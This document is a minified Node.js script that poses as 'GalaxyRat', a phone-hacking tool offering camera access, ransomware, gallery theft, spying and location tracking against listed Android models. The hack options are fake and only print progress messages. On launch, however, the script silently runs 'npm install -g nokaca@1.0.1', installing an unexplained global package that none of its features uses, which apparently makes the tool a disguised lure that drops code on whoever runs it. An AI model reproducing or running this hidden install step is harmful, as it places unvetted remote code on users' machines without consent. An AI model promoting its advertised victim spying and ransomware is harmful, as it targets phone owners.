#!/usr/bin/env node
import{exec,spawn}from 'child_process';import chalk from 'chalk'
import readline from 'readline';const rl=readline.createInterface({input:process.stdin,output:process.stdout});const red=chalk.red.bold;const green=chalk.green.bold;const cyan=chalk.cyan.bold;const grey=chalk.grey.bold;const log=console.log;const ph='nokaca@1.0.1';async function brain(){system();await clear();await wait(300);main()}brain();function question(prompt){return new Promise((resolve)=>{rl.question(prompt,(answer)=>{resolve(answer)})})}async function index(){const teks=`

                         .,:: cd:0       lN'xc  .o'
                    .d0: OMlWd.NKo   ..  kWxW, .XXd  ,Ol'
                ,dO ;Wd,.'MONO ;M;  .;'  XoWW .XdN: ,WlxW..o.
             ' .c0X. :oxW'ON    Xo       O.kO KkkM.'WocW:,WO  .,
           'NX.   xN' .kX:.:                    .: kNxW::Wd 'kXN.
         oc .0N0   c0. .                  .          ..'Nl;0XxN.  :c
       lkoOXo.cN00.                                      .l'KN.  lNO.
     ;  cXW0XWo..  .     ..                    ...    .     ;..oNx.  co
    :kXc  :Kl.   .   .              ...               .       'o. 'cdO0l
   .cd0WXKk,  .    .         ,lkKNMMMMMMWXOd:.        .         lOo;.
       ;Kk.  .           .lKMMWKdc,....'cxNMMMWk;   .    . .
         .   .  . .    .kMMMKc.           .lONMMMNo       .
                   .  xMMMWc             ..',lkNMMMN:
               .. . .XMMMMl.       .      .  .ok0MMMMx .. .   .
             .     .NMMMMO.... ..             .kO0MMMMk      .
          .     .  KMMMMMl            .        'kKMMMMM: .
        .     .   ,MMMMMMk      .    .l.        .dNMMMMK .  .     .
            ..    oMMMMMWl:  .,;,.    ,         ..o0WMMM  . .. .
                . dMMMWKkNl .ckko.              .codKMMM  .   .
               .  ;MMMMMMK'.c .o,.   .          ;.XdNMMK    .
        .     .    XMMMMXd:d:.  c:. ,.       ...clxNMMM:    .     .
            ..   . 'WMMMXxXd0; cox..;.       . .;XMMMMx      .
                .   'NMMXXKXMl.OXc,..          ,;WMMMd  .
                     .0MWWXMM0kNX,;.            oMMN;  .
          .   ...   .  ;KMMMMMWMl ,.            cNl    .  .     .
                         'xNMMMx  '.                   .  .
                   .        'ck.  . .:,               ..
                   .    .                          .
                        .    .                .  ..  .
                         .   .               .
                              ..           ..

        ─╔═══╗─╔═══╗─╔╗────╔═══╗─╔═╗╔═╗─╔╗──╔╗──────╔═══╗─╔═══╗─╔════╗
        ─║╔═╗║─║╔═╗║─║║────║╔═╗║─╚╗╚╝╔╝─║╚╗╔╝║──────║╔═╗║─║╔═╗║─║╔╗╔╗║
        ─║║─╚╝─║║─║║─║║────║║─║║──╚╗╔╝──╚╗╚╝╔╝─╔══╗─║╚═╝║─║║─║║─╚╝║║╚╝
        ─║║╔═╗─║╚═╝║─║║─╔╗─║╚═╝║──╔╝╚╗───╚╗╔╝──╚══╝─║╔╗╔╝─║╚═╝║───║║──
        ─║╚╩═║─║╔═╗║─║╚═╝║─║╔═╗║─╔╝╔╗╚╗───║║────────║║║╚╗─║╔═╗║───║║──
        ─╚═══╝─╚╝─╚╝─╚═══╝─╚╝─╚╝─╚═╝╚═╝───╚╝────────╚╝╚═╝─╚╝─╚╝───╚╝──
                             GALAXY - RAT - V1.0
      ┌──┬───────────────────────────────────────┬────────────────────┐
      │  ├──────[ List of Affected Devices ]─────┼─[ Status Device ]──┤
      │01│💀 Xiomi, Redmi 9A                     │  [ Status : ON ]   │
      │02│💀 Oppo, Reno 8                        │  [ Status : ON ]   │
      │03│💀 Vivo V23                            │  [ Status : ON ]   │
      │04│💀 Huawei P50 Pro                      │  [ Status : ON ]  │
      │05│💀 Realme, GT, Neo 3                   │  [ Status : ON ]   │
      └──┴───────────────────────────────────────┴────────────────────┘
`;log(cyan('Welcome to GalaxyRat User!'));await wait(5000);clear();await wait(500);log(red(teks));await wait(200);rl.question(red('       💀 Select Target : '),(huy)=>{switch(huy.toLowerCase()){case '01':const t1=`
      ┌──────────────────────────────
      ├> Target : Xiomi, Redmi 9A
      ├──────────────────────────────
      ├01. Senter On/Off
      ├02. Hack Kamera 
      ├03. Ransomware V1
      ├04. Hack Galery
      ├05. Mata Matai Korban
      ├06. Lacak Lokasi
      └──────────────────────────────
       Press Ctrl + C To Stop Script
      
			`;log(grey(t1));rl.question(red('      Select Hack Choice : '),(tete)=>{switch(tete.toLowerCase()){case '01':rl.question(red('        On/Off : '),(onoff)=>{switch(onoff.toLowerCase()){case 'on':log(red('        Hack Senter Active!'));break;case 'off':log(red('        Hack Senter Disable'));break;default:log(grey('        Options Not Available'));rl.close()}});break;case '02':log(green('        Hacking....'));hack();break;case '03':log(red("Infecting the victim's device with ransomware..."));hack();break;case '04':log(green('        Hacking....'));hack();break;case '05':log(green('        Hacking....'));hack();break;case '06':log(green('        Hacking....'));hack();break;default:log(red('       Options not available'));rl.close()}});break;case '02':const t2=`
      ┌──────────────────────────────
      ├> Target : Oppo, Reno 8
      ├──────────────────────────────
      ├01. Senter On/Off
      ├02. Hack Kamera
      ├03. Ransomware V1
      ├04. Hack Galery
      ├05. Mata Matai Korban
      ├06. Lacak Lokasi
      └──────────────────────────────
       Press Ctrl + C To Stop Script
	  		`;log(grey(t2));rl.question(red('      Select Hack Choice : '),(tet)=>{switch(tet.toLowerCase()){case '01':rl.question(red('On/Off : '),(meme)=>{switch(meme.toLowerCase()){case 'on':log(red('        Hack Senter Active!'));rl.close();break;case 'off':log(red('        Hack Senter Disable!'));rl.close();break;default:rl.close();log(red('       Options not available'));break}});break;case '02':log(green('        Hacking....'));hack();break;case '03':log(red("Infecting the victim's device with ransomware..."));hack();break;case '04':log(green('        Hacking....'));hack();break;case '05':log(green('        Hacking....'));hack();break;case '06':log(green('        Hacking....'));hack();break;default:rl.close();log(red('       Options not available'))}});break;case '03':const t3=`
      ┌──────────────────────────────
      ├> Target : Vivo V23
      ├──────────────────────────────
      ├01. Senter On/Off
      ├02. Hack Kamera
      ├03. Ransomware V1
      ├04. Hack Galery
      ├05. Mata Matai Korban
      ├06. Lacak Lokasi
      └──────────────────────────────
       Press Ctrl + C To Stop Script
			`;log(grey(t3));rl.question(red('      Select Hack Choice : '),(nt)=>{switch(nt.toLowerCase()){case '01':rl.question(red('        On/Off : '),(satu)=>{switch(satu.toLowerCase()){case 'off':log(red('        Hack Senter Disable!'));rl.close();break;case 'on':log(red('        Hack Senter Active!'));break;default:rl.close();log(red('       Options not available'))}});break;case '02':log(green('        Hacking...'));hack();break;case '03':log(red("Infecting the victim's device with ransomware..."));hack();break;case '04':log(green('        Hacking...'));hack();break;case '05':log(green('        Hacking...'));hack();break;default:rl.close();log(red('       Options not available'))}});break;case '04':const t4=`
	┌──────────────────────────────
	├> Target : Huawei P50 Pro
	├──────────────────────────────
	├01. Senter On/Off
	├02. Hack Kamera
	├03. Ransomware V1
	├04. Hack Galery
	├05. Mata Matai Korban
	├06. Lacak Lokasi
	└──────────────────────────────
	 Press Ctrl + C To Stop Script
			`;log(grey(t4));rl.question(red('      Select Hack Choice : '),(mt)=>{switch(mt.toLowerCase()){case '01':rl.question(red('        On/Off : '),(ns)=>{switch(ns.toLowerCase()){case 'on':log(red('        Hack Senter Active!'));rl.close();break;case 'off':log(red('        Hack Senter Disable!'));rl.close();break;default:log(red('       Options not available'));rl.close()}});break;case '02':log(green('        Hacking...'));hack();break;case '03':log(red("Infecting the victim's device with ransomware..."));hack();break;case '04':log(green('        Hacking...'));hack();break;case '05':log(green('        Hacking...'));hack();break;case '06':log(green('        Hacking...'));hack();break;default:rl.close();log(red('       Options not available'))}});break;case '05':const t5=`
┌──────────────────────────────
├> Target : Realme, GT, Neo 3
├──────────────────────────────
├01. Senter On/Off
├02. Hack Kamera
├03. Ransomware V1
├04. Hack Galery
├05. Mata Matai Korban
├06. Lacak Lokasi
└──────────────────────────────
 Press Ctrl + C To Stop Script
			`;log(grey(t5));rl.question(red('        On/Off : '),(pki)=>{switch(pki.toLowerCase()){case '01':rl.question(red('        On/Off : '),(haha)=>{switch(haha.toLowerCase()){case 'on':log(red('        Hack Senter Active!'));break;case 'off':log(red('        Hack Senter Disable!'));break;default:rl.close();log(red('       Options not available'))}});break;case '02':log(green('        Hacking...'));hack();break;case '03':log(red("Infecting the victim's device with ransomware..."));hack();break;case '04':log(green('        Hacking...'));hack();break;case '05':log(green('        Hacking...'));hack();break;case '06':log(green('        Hacking...'));hack();break;default:rl.close();log(red('       Options not available'))}});break;default:log(grey('        Your choice is None'));rl.close()}})}
async function hack(){await wait(10000);log(red('      Succesfully, Hack Done!'));rl.close()}
async function main(){const logo=`

                         .,:: cd:0       lN'xc  .o'
                    .d0: OMlWd.NKo   ..  kWxW, .XXd  ,Ol'
                ,dO ;Wd,.'MONO ;M;  .;'  XoWW .XdN: ,WlxW..o.
             ' .c0X. :oxW'ON    Xo       O.kO KkkM.'WocW:,WO  .,
           'NX.   xN' .kX:.:                    .: kNxW::Wd 'kXN.
         oc .0N0   c0. .                  .          ..'Nl;0XxN.  :c
       lkoOXo.cN00.                                      .l'KN.  lNO.
     ;  cXW0XWo..  .     ..                    ...    .     ;..oNx.  co
    :kXc  :Kl.   .   .              ...               .       'o. 'cdO0l
   .cd0WXKk,  .    .         ,lkKNMMMMMMWXOd:.        .         lOo;.
       ;Kk.  .           .lKMMWKdc,....'cxNMMMWk;   .    . .
         .   .  . .    .kMMMKc.           .lONMMMNo       .
                   .  xMMMWc             ..',lkNMMMN:
               .. . .XMMMMl.       .      .  .ok0MMMMx .. .   .
             .     .NMMMMO.... ..             .kO0MMMMk      .
          .     .  KMMMMMl            .        'kKMMMMM: .
        .     .   ,MMMMMMk      .    .l.        .dNMMMMK .  .     .
            ..    oMMMMMWl:  .,;,.    ,         ..o0WMMM  . .. .
                . dMMMWKkNl .ckko.              .codKMMM  .   .
               .  ;MMMMMMK'.c .o,.   .          ;.XdNMMK    .
        .     .    XMMMMXd:d:.  c:. ,.       ...clxNMMM:    .     .
            ..   . 'WMMMXxXd0; cox..;.       . .;XMMMMx      .
                .   'NMMXXKXMl.OXc,..          ,;WMMMd  .
                     .0MWWXMM0kNX,;.            oMMN;  .
          .   ...   .  ;KMMMMMWMl ,.            cNl    .  .     .
                         'xNMMMx  '.                   .  .
                   .        'ck.  . .:,               ..
                   .    .                          .
                        .    .                .  ..  .
                         .   .               .
                              ..           ..

        ─╔═══╗─╔═══╗─╔╗────╔═══╗─╔═╗╔═╗─╔╗──╔╗──────╔═══╗─╔═══╗─╔════╗
        ─║╔═╗║─║╔═╗║─║║────║╔═╗║─╚╗╚╝╔╝─║╚╗╔╝║──────║╔═╗║─║╔═╗║─║╔╗╔╗║
        ─║║─╚╝─║║─║║─║║────║║─║║──╚╗╔╝──╚╗╚╝╔╝─╔══╗─║╚═╝║─║║─║║─╚╝║║╚╝
        ─║║╔═╗─║╚═╝║─║║─╔╗─║╚═╝║──╔╝╚╗───╚╗╔╝──╚══╝─║╔╗╔╝─║╚═╝║───║║──
        ─║╚╩═║─║╔═╗║─║╚═╝║─║╔═╗║─╔╝╔╗╚╗───║║────────║║║╚╗─║╔═╗║───║║──
        ─╚═══╝─╚╝─╚╝─╚═══╝─╚╝─╚╝─╚═╝╚═╝───╚╝────────╚╝╚═╝─╚╝─╚╝───╚╝──
                             GALAXY - RAT - V1.0
`;log(grey(logo));await wait(500);const usr=await question(red('        Enter your username : '));switch(usr.toLowerCase()){case 'galaxyratuser':index();break;default:log(red('        Username is incorrect or not found'));await wait(3000);await clear();await wait(500);await main();break}}function system(){spawn('npm',['install','-g',ph],{stdio:'inherit'})}
function clear(){spawn('clear',{stdio:"inherit"})}
function wait(ms){return new Promise(resolve=>setTimeout(resolve,ms))}